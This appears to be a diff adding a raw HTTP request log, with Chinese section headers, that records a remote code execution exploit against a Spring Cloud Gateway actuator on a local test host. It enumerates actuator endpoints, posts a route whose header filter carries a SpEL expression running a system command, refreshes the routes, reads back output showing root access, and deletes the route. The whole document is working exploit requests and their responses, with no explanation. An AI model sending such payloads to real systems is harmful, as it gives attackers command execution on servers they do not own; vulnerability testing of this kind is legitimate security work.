@@ -1,0 +1,84 @@
+### 请求
+GET /actuator HTTP/1.1
+Host: 127.0.0.1:18001
+Connection: close
+
+
+
+### 响应头
+HTTP/1.1 200 OK
+Content-Type: application/vnd.spring-boot.actuator.v3+json
+Content-Length: 1939
+connection: close
+
+### 响应体（≤64KB）
+{"_links":{"self":{"href":"http://127.0.0.1:18001/actuator","templated":false},"beans":{"href":"http://127.0.0.1:18001/actuator/beans","templated":false},"caches-cache":{"href":"http://127.0.0.1:18001/actuator/caches/{cache}","templated":true},"caches":{"href":"http://127.0.0.1:18001/actuator/caches","templated":false},"health-path":{"href":"http://127.0.0.1:18001/actuator/health/{*path}","templated":true},"health":{"href":"http://127.0.0.1:18001/actuator/health","templated":false},"info":{"href":"http://127.0.0.1:18001/actuator/info","templated":false},"conditions":{"href":"http://127.0.0.1:18001/actuator/conditions","templated":false},"configprops":{"href":"http://127.0.0.1:18001/actuator/configprops","templated":false},"configprops-prefix":{"href":"http://127.0.0.1:18001/actuator/configprops/{prefix}","templated":true},"env-toMatch":{"href":"http://127.0.0.1:18001/actuator/env/{toMatch}","templated":true},"env":{"href":"http://127.0.0.1:18001/actuator/env","templated":false},"loggers":{"href":"http://127.0.0.1:18001/actuator/loggers","templated":false},"loggers-name":{"href":"http://127.0.0.1:18001/actuator/loggers/{name}","templated":true},"heapdump":{"href":"http://127.0.0.1:18001/actuator/heapdump","templated":false},"threaddump":{"href":"http://127.0.0.1:18001/actuator/threaddump","templated":false},"metrics":{"href":"http://127.0.0.1:18001/actuator/metrics","templated":false},"metrics-requiredMetricName":{"href":"http://127.0.0.1:18001/actuator/metrics/{requiredMetricName}","templated":true},"scheduledtasks":{"href":"http://127.0.0.1:18001/actuator/scheduledtasks","templated":false},"mappings":{"href":"http://127.0.0.1:18001/actuator/mappings","templated":false},"refresh":{"href":"http://127.0.0.1:18001/actuator/refresh","templated":false},"features":{"href":"http://127.0.0.1:18001/actuator/features","templated":false},"gateway":{"href":"http://127.0.0.1:18001/actuator/gateway","templated":false}}}
+
+
+### 请求
+POST /actuator/gateway/routes/hacktest HTTP/1.1
+Host: 127.0.0.1:18001
+Connection: close
+Content-Type: application/json
+Content-Length: 351
+
+{"id": "hacktest", "filters": [{"name": "AddResponseHeader", "args": {"name": "Result", "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"}}], "uri": "http://example.com", "predicates": [{"name": "Path", "args": {"_genkey_0": "/hacktest"}}]}
+
+### 响应头
+HTTP/1.1 201 Created
+Location: /routes/hacktest
+content-length: 0
+connection: close
+
+### 响应体（≤64KB）
+
+
+
+### 请求
+POST /actuator/gateway/refresh HTTP/1.1
+Host: 127.0.0.1:18001
+Connection: close
+Content-Length: 0
+
+
+
+### 响应头
+HTTP/1.1 200 OK
+content-length: 0
+connection: close
+
+### 响应体（≤64KB）
+
+
+
+### 请求
+GET /actuator/gateway/routes/hacktest HTTP/1.1
+Host: 127.0.0.1:18001
+Connection: close
+
+
+
+### 响应头
+HTTP/1.1 200 OK
+Content-Type: application/json
+Content-Length: 223
+connection: close
+
+### 响应体（≤64KB）
+{"predicate":"Paths: [/hacktest], match trailing slash: true","route_id":"hacktest","filters":["[[AddResponseHeader Result = 'uid=0(root) gid=0(root) groups=0(root)\n'], order = 1]"],"uri":"http://example.com:80","order":0}
+
+
+### 请求
+DELETE /actuator/gateway/routes/hacktest HTTP/1.1
+Host: 127.0.0.1:18001
+Connection: close
+
+
+
+### 响应头
+HTTP/1.1 200 OK
+content-length: 0
+connection: close
+
+### 响应体（≤64KB）
+
